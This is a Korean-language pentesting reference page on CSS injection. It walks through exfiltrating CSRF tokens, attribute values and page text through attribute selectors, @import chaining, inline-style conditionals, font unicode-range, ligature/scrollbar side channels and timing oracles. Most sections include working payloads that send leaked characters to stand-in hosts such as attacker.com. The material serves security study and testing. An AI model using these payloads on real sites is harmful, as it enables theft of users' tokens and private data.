# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### 속성 선택자

CSS 선택자는 `input` 요소의 `name` 및 `value` 속성 값과 일치하도록 작성됩니다. 만약 `input` 요소의 `value` 속성이 특정 문자로 시작하면, 미리 정의된 외부 리소스가 로드됩니다:
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
하지만 이 접근법은 숨겨진 input 요소(`type="hidden"`)를 다룰 때 한계가 있습니다. 숨겨진 요소는 배경을 로드하지 않기 때문입니다.

#### 숨겨진 요소 우회 방법

이 한계를 우회하려면 `~` 일반 형제 결합자 (general sibling combinator)를 사용해 이후의 형제 요소를 타깃할 수 있습니다. 그러면 해당 CSS 규칙이 숨겨진 input 요소 뒤에 오는 모든 형제에 적용되어 배경 이미지가 로드됩니다:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
이 기술을 악용한 실제 예시는 제공된 코드 스니펫에 자세히 나와 있습니다. 확인은 [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e)에서 할 수 있습니다.

#### CSS Injection을 위한 전제 조건

For the CSS Injection technique to be effective, certain conditions must be met:

1. **Payload Length**: CSS injection 벡터는 조작된 selectors를 수용할 수 있을 만큼 충분히 긴 payload를 지원해야 합니다.
2. **CSS Re-evaluation**: 페이지를 프레임화(frame)할 수 있는 능력이 있어야 하며, 이는 새로 생성된 payload로 CSS의 재평가를 트리거하는 데 필요합니다.
3. **External Resources**: 이 기법은 외부에 호스팅된 이미지를 사용할 수 있다는 가정하에 동작합니다. 이는 사이트의 Content Security Policy (CSP)에 의해 제한될 수 있습니다.

### Blind Attribute Selector

As [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration), it's possible to combine the selectors **`:has`** and **`:not`** to identify content even from blind elements.\
이는 CSS injection을 로드하는 웹 페이지 내부에 무엇이 들어있는지 전혀 모를 때 매우 유용합니다.\
또한 이러한 선택자들을 사용해 동일한 유형의 여러 블록에서 정보를 추출하는 것도 가능합니다. 예:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Combining this with the following **@import** technique, it's possible to exfiltrate a lot of **info using CSS injection from blind pages with** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

앞선 기법에는 몇 가지 단점이 있으니 사전 조건을 확인하세요. 공격 대상에게 여러 개의 링크를 보낼 수 있어야 하거나, CSS injection 취약 페이지를 iframe할 수 있어야 합니다.

하지만 **CSS `@import`**를 사용하는 또 다른 영리한 기법이 있어 기법의 효율을 향상시킬 수 있습니다.

이 방법은 [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)가 처음에 공개했으며 동작 방식은 다음과 같습니다:

이전처럼 같은 페이지를 매번 수십 개의 서로 다른 payload로 반복 로드하는 대신, 페이지를 한 번만 로드하고 공격자 서버로의 import만 포함시킵니다(이것이 공격 대상에게 보낼 payload입니다):
```css
@import url("//attacker.com:5001/start?");
```
1. import는 공격자로부터 **일부 CSS script를 받**고 **브라우저가 이를 로드**합니다.
2. 공격자가 보낼 CSS script의 첫 부분은 **다시 공격자 서버로의 또 다른 `@import`**입니다.
1. 공격자 서버는 이 요청에 아직 응답하지 않습니다. 먼저 일부 문자를 leak한 뒤, 다음 문자들을 leak하기 위한 payload로 이 import에 응답하려고 하기 때문입니다.
3. 페이로드의 두 번째이자 더 큰 부분은 **attribute selector leakage payload**가 될 것입니다.
1. 이것은 공격자 서버로 비밀의 **첫 문자와 마지막 문자**를 전송합니다.
4. 공격자 서버가 비밀의 **첫 문자와 마지막 문자**를 수신하면, **2단계에서 요청된 import에 응답**합니다.
1. 응답은 **2, 3, 4단계와 정확히 동일**하지만 이번에는 비밀의 **두 번째 문자와 끝에서 두 번째 문자**를 찾으려고 시도합니다.

공격자는 이 루프를 f**ollow 하여 비밀을 완전히 leak**할 때까지 반복합니다.

You can find the original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the [**same code but commented here**.](#css-injection)

> [!TIP]
> 스크립트는 매번 앞에서부터와 뒤에서부터 두 글자씩(총 2 chars) 발견하려고 시도합니다. 이는 attribute selector가 다음과 같은 동작을 허용하기 때문입니다:
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> 이 방식은 스크립트가 secret을 더 빠르게 leak할 수 있게 합니다.

> [!WARNING]
> 때때로 스크립트는 접두사(prefix) + 접미사(suffix)로 발견된 값이 이미 전체 flag임을 **올바르게 감지하지 못**하고, 앞쪽(prefix)은 계속 앞으로 진행하고 뒤쪽(suffix)은 계속 뒤로 진행하다가 어느 순간 멈출 수 있습니다.\
> 걱정할 필요 없습니다. **output**을 확인하면 **flag를 볼 수 있습니다**.

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

This primitive enables exfiltration using only an element's inline style attribute, without selectors or external stylesheets. It relies on CSS custom properties, the attr() function to read same-element attributes, the new CSS if() conditionals for branching, and image-set() to trigger a network request that encodes the matched value.

> [!WARNING]
> Equality comparisons in if() require double quotes for string literals. Single quotes will not match.

- Sink: 요소의 style 속성을 제어하고 대상 attribute가 동일 요소에 있어야 합니다 (attr()은 동일 요소의 attribute만 읽습니다).
- Read: attribute를 CSS 변수에 복사합니다: `--val: attr(title)`.
- Decide: 변수를 문자열 후보들과 비교하는 중첩된 조건문으로 URL을 선택합니다: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: `background: image-set(var(--steal))` (또는 네트워크 요청을 트리거하는 다른 fetching 속성)을 적용하여 선택된 엔드포인트로 요청을 강제합니다.

Attempt (does not work; single quotes in comparison):
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
작동하는 payload(비교에서 큰따옴표 필요):
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
중첩된 조건문을 사용한 속성 값 열거:
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
현실적인 데모 (probing usernames):
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
노트 및 제한사항:

- 연구 시점에는 Chromium 기반 브라우저에서 동작합니다; 다른 엔진에서는 동작이 다를 수 있습니다.
- IDs, flags, 짧은 사용자명 같은 유한/열거 가능한 값 공간에 가장 적합합니다. 외부 스타일시트 없이 임의의 긴 문자열을 훔치는 것은 여전히 어렵습니다.
- URL을 가져오는 모든 CSS 속성(예: background/image-set, border-image, list-style, cursor, content)은 요청을 트리거하는 데 사용할 수 있습니다.

자동화: a Burp Custom Action은 중첩된 inline-style 페이로드를 생성해 속성 값을 브루트포스할 수 있습니다: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### 기타 선택자

DOM의 일부에 접근하는 다른 방법들 (**CSS selectors**로):

- **`.class-to-search:nth-child(2)`**: DOM에서 클래스 "class-to-search"를 가진 두 번째 항목을 검색합니다.
- **`:empty`** selector: Used for example in [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### Error 기반 XS-Search

참고: [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

전체 목적은 **제어된 엔드포인트에서 커스텀 폰트를 사용**하고, **지정된 리소스(`favicon.ico`)를 로드할 수 없을 때만 해당 폰트로 텍스트(이 경우, 'A')가 표시되도록 하는 것**입니다.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **커스텀 폰트 사용**:

- 커스텀 폰트는 `<head>` 섹션의 `<style>` 태그 안에서 `@font-face` 규칙을 사용해 정의됩니다.
- 폰트 이름은 `poc`이며 외부 엔드포인트(`http://attacker.com/?leak`)에서 로드됩니다.
- `unicode-range` 속성은 `U+0041`로 설정되어 특정 유니코드 문자 'A'를 대상으로 합니다.

2. **Object 요소 및 폴백 텍스트**:
- `<body>` 섹션에 `id="poc0"`를 가진 `<object>` 요소가 생성됩니다. 이 요소는 `http://192.168.0.1/favicon.ico`에서 리소스를 로드하려 시도합니다.
- 이 요소의 `font-family`는 `<style>` 섹션에 정의된 대로 `'poc'`로 설정됩니다.
- 리소스(`favicon.ico`) 로드에 실패하면 `<object>` 태그 내부의 폴백 콘텐츠(문자 'A')가 표시됩니다.
- 외부 리소스를 로드할 수 없을 때 폴백 콘텐츠('A')는 커스텀 폰트 `poc`로 렌더링됩니다.

### Scroll-to-Text Fragment 스타일링

The **`:target`** pseudo-class는 [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo)에 명시된 대로 **URL fragment**에 의해 대상이 된 요소를 선택하는 데 사용됩니다. `::target-text`는 조각(fragment)에서 텍스트가 명시적으로 타겟팅되지 않는 한 어떤 요소와도 매치되지 않는다는 점을 이해하는 것이 중요합니다.

공격자가 **Scroll-to-text** fragment 기능을 악용하면 보안 문제가 발생합니다. 이로 인해 공격자는 HTML injection을 통해 자신의 서버에서 리소스를 로드해 웹페이지에 특정 텍스트가 존재하는지 확인할 수 있습니다. 방법은 다음과 같은 CSS 규칙을 주입하는 것을 포함합니다:
```css
:target::before {
content: url(target.png);
}
```
이러한 시나리오에서는 페이지에 "Administrator" 텍스트가 존재하면 리소스 `target.png`가 서버에 요청되어 해당 텍스트의 존재를 나타냅니다. 이 공격의 한 사례는 주입된 CSS를 Scroll-to-text fragment와 함께 포함한 특수하게 조작된 URL을 통해 실행할 수 있습니다:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
여기서 공격자는 HTML injection을 조작하여 CSS 코드를 전송하고, Scroll-to-text fragment (`#:~:text=Administrator`)를 통해 특정 텍스트 "Administrator"을 겨냥합니다. 해당 텍스트가 발견되면 지정된 리소스가 로드되어 그 존재를 공격자에게 의도치 않게 알립니다.

완화 조치로 다음 사항을 유의해야 합니다:

1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF)는 단어 또는 문장만 매칭하도록 설계되어 임의의 비밀이나 토큰을 leak하는 능력을 제한합니다.
2. **Restriction to Top-level Browsing Contexts**: STTF는 최상위 브라우징 컨텍스트에서만 작동하며 iframes 내에서는 동작하지 않으므로, 악용 시도가 사용자에게 더 눈에 띄게 됩니다.
3. **Necessity of User Activation**: STTF는 동작하기 위해 user-activation 제스처가 필요하므로 악용은 사용자에 의해 시작된 네비게이션을 통해서만 현실적으로 가능합니다. 이 요구사항은 사용자 상호작용 없이 공격이 자동화될 위험을 상당히 완화합니다. 그럼에도 불구하고 블로그 게시물의 저자는 공격 자동화를 용이하게 할 수 있는 특정 조건 및 우회(예: social engineering, interaction with prevalent browser extensions)를 지적합니다.

이러한 메커니즘과 잠재적 취약점을 인지하는 것이 웹 보안을 유지하고 이러한 악용 전술로부터 보호하는 데 핵심입니다.

자세한 내용은 원문 보고서를 확인하세요: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

다음 링크에서 [**exploit using this technique for a CTF here**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb)를 확인할 수 있습니다.

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

특정 유니코드 값에 대해 **외부 폰트를 지정할 수 있으며**, 해당 유니코드 값이 페이지에 존재할 때에만 **수집됩니다**. 예를 들어:
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**참고:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

The technique described involves extracting text from a node by exploiting font ligatures and monitoring changes in width. The process involves several steps:

1. **커스텀 폰트 생성**:

- SVG 폰트는 glyph에 `horiz-adv-x` 속성을 지정하여 두 문자 시퀀스를 나타내는 glyph의 너비를 크게 설정하도록 제작된다.
- 예시 SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, 여기서 "XY"는 두 문자 시퀀스를 의미한다.
- 그런 다음 이 폰트들은 fontforge를 사용해 woff 포맷으로 변환된다.

2. **너비 변화 감지**:

- 텍스트가 줄 바꿈되지 않도록(`white-space: nowrap`) 하고 스크롤바 스타일을 사용자화하기 위해 CSS를 사용한다.
- 특이하게 스타일된 수평 스크롤바의 등장으로 특정 ligature, 즉 특정 문자 시퀀스가 텍스트에 존재함을 표시하는 지표(oracle)로 작동한다.
- 관련 CSS:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Exploit Process**:

- **Step 1**: 너비가 큰 두 문자 쌍에 대해 폰트를 생성한다.
- **Step 2**: 스크롤바 기반 기법을 이용해 대형 glyph(문자 쌍에 대한 ligature)가 렌더링될 때 이를 감지하여 해당 문자 시퀀스의 존재를 식별한다.
- **Step 3**: ligature를 감지하면, 감지된 쌍에 앞뒤 문자 하나를 추가해 세 문자 시퀀스를 나타내는 새 glyph들을 생성한다.
- **Step 4**: 세 문자 ligature의 감지를 수행한다.
- **Step 5**: 이 과정을 반복해 텍스트 전체를 점진적으로 드러낸다.

4. **최적화**:
- 현재 `<meta refresh=...`를 사용한 초기화 방법은 최적이 아니다.
- 더 효율적인 방법으로는 CSS `@import` 트릭을 사용해 exploit의 성능을 향상시키는 것이 있다.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**참고:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

This trick was released in this [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). 텍스트 노드에서 사용된 charset은 브라우저에 설치된 **default fonts**를 사용해 leaked 될 수 있다: 외부 또는 custom 폰트는 필요 없다.

이 개념은 애니메이션을 이용해 `div`의 너비를 점진적으로 확장시켜 한 번에 하나씩 문자가 텍스트의 'suffix' 부분에서 'prefix' 부분으로 이동하게 하는 것이다. 이 과정은 텍스트를 실질적으로 두 부분으로 분리한다:

1. **Prefix**: 초기 줄.
2. **Suffix**: 이후 줄들.

문자들의 전환 단계는 다음과 같이 보일 것이다:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

이 전환 동안, **unicode-range trick**을 사용해 새로운 문자가 prefix에 합류할 때마다 식별한다. 이는 폰트를 Comic Sans로 전환함으로써 이루어지는데, Comic Sans는 default font보다 눈에 띄게 높기 때문에 세로 스크롤바가 발생한다. 이 스크롤바의 등장으로 prefix에 새로운 문자가 들어왔음이 간접적으로 드러난다.

이 방법은 개별 문자가 등장할 때 이를 감지할 수 있게 해주지만, 어떤 문자가 반복되었는지는 특정하지 못하고 단지 반복이 발생했다는 사실만 알려준다.

> [!TIP]
> 기본적으로, **unicode-range is used to detect a char**, 하지만 외부 폰트를 로드하고 싶지 않으므로 다른 방법을 찾아야 한다.\
> 문자가 **found**되면 사전 설치된 **Comic Sans font**가 적용되어 문자가 **bigger**해지고 **triggers a scroll bar**가 발생하며, 이는 발견된 문자를 **leak**한다.

PoC에서 추출한 코드를 확인하라:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset — 기본 폰트를 사용해 요소를 숨기는 방식 (외부 자산 불필요) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**참조:** 이 내용은 [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)로 언급되어 있다

이 경우는 이전 경우와 매우 유사하다. 다만 여기서 특정 **문자를 다른 문자보다 더 크게 만들어 무언가를 숨기는 것**의 목적은 봇이 누르지 않도록 버튼을 가리거나 로드되지 않을 이미지처럼 어떤 요소를 숨기는 것이다. 따라서 우리는 그 동작(또는 동작의 부재)을 측정하여 특정 문자가 텍스트 안에 존재하는지 알 수 있다.

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**참조:** 이 내용은 [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)로 언급되어 있다

이 경우에는 같은 출처에서 가짜 폰트를 로드하여 특정 문자가 텍스트에 있는지 leak하려고 시도할 수 있다:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
If there is a match, the **폰트는 `/static/bootstrap.min.css?q=1`에서 로드됩니다**. 비록 정상적으로 로드되지는 않더라도, **브라우저는 이를 캐시해야 하며**, 캐시가 없어도 **304 not modified** 메커니즘이 있으므로 **응답이 다른 것들보다 더 빠를 것**입니다.

하지만 캐시된 응답과 비캐시 응답 간의 시간 차이가 충분히 크지 않으면 유용하지 않습니다. 예를 들어, 작성자는 다음과 같이 언급했습니다: 그러나 테스트 후에 나는 첫 번째 문제는 속도 차이가 크지 않다는 것이고, 두 번째 문제는 봇이 `disk-cache-size=1` 플래그를 사용한다는 점인데, 이는 정말 신경을 쓴 것이다.

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** 이 내용은 [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)에서 언급되어 있습니다.

이 경우 일치가 발생하면 동일 출처에서 수백 개의 가짜 폰트를 로드하도록 **CSS를 지정할 수 있습니다**. 이렇게 하면 **걸리는 시간을 측정**하여 문자가 나타나는지 여부를 다음과 같은 방식으로 알아낼 수 있습니다:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
그리고 봇의 코드는 다음과 같습니다:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
따라서 글꼴이 일치하지 않으면 봇 방문 시 응답 시간은 약 30초로 예상됩니다. 반면 글꼴이 일치하면 글꼴을 가져오기 위해 여러 요청이 전송되어 네트워크 활동이 계속 발생합니다. 그 결과 정지 조건을 만족하고 응답을 받는 데 더 오래 걸립니다. 따라서 응답 시간은 글꼴 일치 여부를 판단하는 지표로 사용할 수 있습니다.

## 참고 자료

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
